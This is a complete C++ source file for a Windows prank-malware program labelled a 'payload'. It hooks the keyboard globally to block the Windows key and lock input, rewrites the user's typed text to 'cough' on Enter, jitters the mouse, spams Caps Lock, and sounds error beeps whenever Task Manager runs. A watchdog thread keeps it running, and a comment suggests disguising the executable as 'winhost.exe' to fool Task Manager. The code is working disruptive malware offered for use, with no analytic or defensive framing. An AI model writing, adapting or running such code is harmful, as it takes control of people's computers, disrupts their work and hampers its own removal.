#define WINVER 0x0600
#define _WIN32_WINNT 0x0600
#define NOMINMAX

#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <atomic>
#include <vector>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <string>
#include <mutex>
#include <condition_variable>

// Globals for control
std::atomic<bool> running(true);
std::atomic<bool> macroRunning(false);
std::atomic<bool> inputLocked(false);
std::atomic<bool> screamRunning(true);

std::mutex mainThreadMutex;
std::condition_variable mainThreadCv;
std::thread::id mainThreadId;

// --- Task Manager renaming trick (rename process to winhost.exe) ---
// Note: process name shown in Task Manager usually from executable name
// so you should rename the executable file itself to "winhost.exe" to fool Task Manager.

// --- Function prototypes ---
bool IsTaskManagerRunning();
void screamTaskManager();
void jitterMouse();
void flashCapsLock();
void MacroTypeCoughThenEnter();
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
void MainPayload();

// --- Keyboard hook handle ---
HHOOK keyboardHook = NULL;

// --- Smooth relative mouse move ---
void smoothRelativeMove(int totalDx, int totalDy, int steps = 20, int stepDelayMs = 5)
{
    double accX = 0.0, accY = 0.0;
    double dxStep = totalDx / static_cast<double>(steps);
    double dyStep = totalDy / static_cast<double>(steps);
    int lastX = 0, lastY = 0;

    for (int i = 1; i <= steps && running; ++i)
    {
        accX += dxStep;
        accY += dyStep;

        int moveX = static_cast<int>(round(accX)) - lastX;
        int moveY = static_cast<int>(round(accY)) - lastY;

        lastX += moveX;
        lastY += moveY;

        if (moveX != 0 || moveY != 0)
        {
            INPUT input = {};
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_MOVE;
            input.mi.dx = moveX;
            input.mi.dy = moveY;
            SendInput(1, &input, sizeof(INPUT));
        }
        Sleep(stepDelayMs);
    }
}

// --- Mouse jiggler ---
void jitterMouse()
{
    while (running)
    {
        if ((rand() % 100) < 5) // 5% chance big jolt
        {
            int dx = (rand() % 201) - 100;
            int dy = (rand() % 201) - 100;
            smoothRelativeMove(dx, dy, 20, 5);
        }
        else
        {
            int dx = (rand() % 5) - 2;
            int dy = (rand() % 5) - 2;
            if (dx == 0 && dy == 0) dx = 1;

            INPUT input = {};
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_MOVE;
            input.mi.dx = dx;
            input.mi.dy = dy;
            SendInput(1, &input, sizeof(INPUT));
        }
        Sleep(10 + (rand() % 11));
    }
}

// --- Caps Lock spam ---
void flashCapsLock()
{
    while (running)
    {
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
}

// --- Task Manager running check ---
bool IsTaskManagerRunning()
{
    bool found = false;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, "taskmgr.exe") == 0)
            {
                found = true;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found;
}

// --- Scream error sounds while Task Manager is running ---
void screamTaskManager()
{
    while (screamRunning)
    {
        if (IsTaskManagerRunning())
        {
            // Play random burst of error sounds lasting about 1.5 seconds
            auto start = std::chrono::steady_clock::now();
            while (IsTaskManagerRunning() &&
                std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count() < 1500)
            {
                // Play random error beep types:
                UINT beepTypes[] = { MB_ICONHAND, MB_ICONERROR, MB_ICONWARNING, MB_ICONQUESTION };
                UINT beep = beepTypes[rand() % (sizeof(beepTypes) / sizeof(UINT))];
                MessageBeep(beep);
                std::this_thread::sleep_for(std::chrono::milliseconds(150));
            }
            // After burst, small pause before checking again
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
        }
        else
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }
}

// --- Keyboard helper functions ---
void PressKey(WORD vk)
{
    keybd_event(vk, 0, 0, 0);
}

void ReleaseKey(WORD vk)
{
    keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
}

void TypeChar(char c)
{
    SHORT vk = VkKeyScanA(c);
    if (vk == -1) return;

    BYTE vkCode = LOBYTE(vk);
    BYTE shiftState = HIBYTE(vk);

    if (shiftState & 1) PressKey(VK_SHIFT);

    PressKey(vkCode);
    ReleaseKey(vkCode);

    if (shiftState & 1) ReleaseKey(VK_SHIFT);
}

// --- Macro to replace user input with "cough" on Enter ---
void MacroTypeCoughThenEnter()
{
    macroRunning = true;    // Block user input during macro
    std::this_thread::sleep_for(std::chrono::milliseconds(10));

    // Ctrl + A to select all
    PressKey(VK_CONTROL);
    PressKey('A');
    ReleaseKey('A');
    ReleaseKey(VK_CONTROL);

    std::this_thread::sleep_for(std::chrono::milliseconds(10));

    // Delete selection
    PressKey(VK_DELETE);
    ReleaseKey(VK_DELETE);

    std::this_thread::sleep_for(std::chrono::milliseconds(10));

    // Type "cough" fast lowercase
    const char* text = "cough";
    for (const char* p = text; *p; ++p)
    {
        TypeChar(*p);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(10));

    // Press Enter
    PressKey(VK_RETURN);
    ReleaseKey(VK_RETURN);

    macroRunning = false;   // Unblock user input
}

// --- Keyboard hook ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;

        bool injected = (kb->flags & LLKHF_INJECTED) != 0;

        // Block all input while inputLocked (except Win key release)
        if (inputLocked)
        {
            if (!injected)
            {
                // Unlock input on Win key up
                if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN))
                {
                    inputLocked = false;
                    return 1; // block key event anyway
                }
                // Block everything else while locked
                return 1;
            }
        }

        // Detect Windows key down to lock input + block Start menu
        if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && !injected &&
            (kb->vkCode == VK_LWIN || kb->vkCode == VK_RWIN))
        {
            inputLocked = true;

            // Immediately send Windows key up to prevent Start menu
            INPUT ip = {};
            ip.type = INPUT_KEYBOARD;
            ip.ki.wVk = (WORD)kb->vkCode;
            ip.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &ip, sizeof(INPUT));

            // Play error sound
            MessageBeep(MB_ICONHAND);

            return 1; // block original Win key down
        }

        // Block user input during macroRunning (except injected)
        if (macroRunning && !injected)
        {
            return 1;
        }

        // Intercept Enter to trigger macro (if not injected)
        if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && kb->vkCode == VK_RETURN && !injected)
        {
            // Run macro async and block this key event
            std::thread(MacroTypeCoughThenEnter).detach();
            return 1;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// --- Main payload thread ---
void MainPayload()
{
    srand((unsigned)time(NULL));

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook)
    {
        MessageBox(NULL, TEXT("Failed to install keyboard hook!"), TEXT("Error"), MB_OK | MB_ICONERROR);
        running = false;
        return;
    }

    std::thread jitterThread(jitterMouse);
    std::thread capsThread(flashCapsLock);
    std::thread screamThread(screamTaskManager);

    MSG msg;
    mainThreadId = std::this_thread::get_id();

    while (GetMessage(&msg, NULL, 0, 0) && running)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running = false;
    screamRunning = false;

    jitterThread.join();
    capsThread.join();
    screamThread.join();

    UnhookWindowsHookEx(keyboardHook);
}

// --- Watchdog thread ---
void Watchdog()
{
    std::thread mainThread;

    while (true)
    {
        if (!mainThread.joinable())
        {
            // Launch main payload thread
            mainThread = std::thread(MainPayload);
        }
        else
        {
            // Check if main thread still running
            if (mainThread.joinable() && mainThreadId != std::thread::id())
            {
                // TODO: You cannot directly test if thread is "alive", 
                // but if mainThread has exited, joinable() will still be true until joined.
                // Let's check if we can join without blocking by using std::try_lock on mutex, 
                // but this is complex, so we'll do a timed wait on a condition variable.

                // Wait max 1 sec, if main thread ended, join it
                std::unique_lock<std::mutex> lk(mainThreadMutex);
                if (mainThreadCv.wait_for(lk, std::chrono::seconds(1)) == std::cv_status::timeout)
                {
                    // Timeout, assume thread is still running
                }
                else
                {
                    // Condition triggered, main thread likely exited, join to clean up
                    if (mainThread.joinable())
                        mainThread.join();
                }
            }
        }

        // Wait a bit before next check
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

int main()
{
    // Seed rand once
    srand((unsigned)time(NULL));

    // Start watchdog thread that launches main payload
    std::thread watchdogThread(Watchdog);

    // Main thread waits for watchdog (never exits)
    watchdogThread.join();

    return 0;
}
